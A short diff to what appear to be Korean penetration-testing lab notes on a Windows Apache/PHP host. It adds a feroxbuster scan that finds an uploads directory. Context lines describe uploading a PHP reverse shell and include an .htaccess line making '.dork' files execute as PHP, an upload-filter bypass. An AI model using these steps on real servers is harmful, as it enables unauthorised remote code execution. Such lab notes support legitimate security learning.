@@ -938,8 +938,12 @@ rot13 디코더
 ```shell
 sudo nmap -sC -sV -Pn -p- 192.168.124.187 -oN 124.187_allport
 
+# web
 whatweb http://192.168.124.187    
 http://192.168.124.187 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], Email[info@example.com], Frame, HTML5, HTTPServer[Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7], IP[192.168.124.187], Lightbox, OpenSSL[1.1.1k], PHP[8.0.7], Script, Title[Access The Event]
+
+feroxbuster -u http://192.168.124.187 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -C 400
+301      GET        9l       30w      344c http://192.168.124.187/uploads => http://192.168.124.187/uploads/
 
 # .htaccess로 확장자 허용 변경 후 php reverse shell을 .dork 확장자로 업로드
 echo "AddType application/x-httpd-php .dork" > .htaccess
